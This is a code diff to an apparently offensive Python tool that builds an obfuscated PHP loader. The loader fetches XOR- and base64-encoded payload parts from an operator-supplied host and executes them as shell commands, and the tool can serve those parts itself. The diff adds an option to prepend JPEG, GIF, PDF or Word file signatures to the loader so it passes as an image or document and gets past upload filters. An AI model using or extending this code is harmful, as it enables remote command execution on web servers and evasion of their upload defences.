@@ -7,6 +7,17 @@ import threading
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from urllib.parse import urlparse
 import sys
+import time
+
+# Define known magic bytes for file type spoofing
+MAGIC_BYTES = {
+    "jpeg": bytes.fromhex("ffd8ffe0"),
+    "gif": bytes.fromhex("47494638"),
+    "pdf": bytes.fromhex("25504446"),
+    "docx": bytes.fromhex("504b0304"),
+    "word": bytes.fromhex("d0cf11e0a1b11ae1"),
+    # Add more as needed
+}
 
 def xor_encode(data, key):
     return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
@@ -36,6 +47,7 @@ def main():
     parser.add_argument("--host", required=True, help="Host URL where PHP fetches parts (e.g., http://192.168.1.7:8000/)")
     parser.add_argument("--output-dir", default=None, help="Directory to save parts and loader.php")
     parser.add_argument("--webserver", action="store_true", help="Start a python HTTP server to serve parts")
+    parser.add_argument("--magic-bytes", default=None, help="Prepend known file signature (e.g., jpeg, pdf, gif, docx, word)")
 
     args = parser.parse_args()
 
@@ -44,7 +56,6 @@ def main():
     port = parsed.port if parsed.port else 8000
     scheme = parsed.scheme if parsed.scheme else "http"
     host = parsed.hostname
-    # Rebuild host with port if missing
     host_url = f"{scheme}://{host}:{port}/"
 
     # Create output directory if specified
@@ -99,8 +110,22 @@ for($i=0;$i<3;$i++)$g=base64_decode($g);
 @`$g`;
 ?>"""
 
+    # Prepend magic bytes if requested
+    if args.magic_bytes:
+        magic_key = args.magic_bytes.lower()
+        if magic_key in MAGIC_BYTES:
+            php = MAGIC_BYTES[magic_key] + php.encode()
+            print(f"[+] Prepended magic bytes for {magic_key}")
+        else:
+            print(f"[!] Unknown magic byte type: '{args.magic_bytes}'")
+            print("    Available options:", ', '.join(MAGIC_BYTES.keys()))
+            sys.exit(1)
+    else:
+        php = php.encode()
+
+    # Save PHP loader
     loader_path = os.path.join(out_dir, "loader.php")
-    with open(loader_path, "w") as f:
+    with open(loader_path, "wb") as f:
         f.write(php)
 
     print(f"[+] PHP loader saved as {loader_path}")
@@ -108,13 +133,12 @@ for($i=0;$i<3;$i++)$g=base64_decode($g);
     # Start HTTP server if asked
     if args.webserver:
         print("[*] Starting HTTP server...")
-        # Run server in thread so script doesn't block (or ctrl+C stops everything)
         server_thread = threading.Thread(target=run_webserver, args=(out_dir, port), daemon=True)
         server_thread.start()
         print("[*] HTTP server running. Press Ctrl+C to stop.")
         try:
             while True:
-                pass
+                time.sleep(1)
         except KeyboardInterrupt:
             print("\n[!] HTTP server stopped.")
 
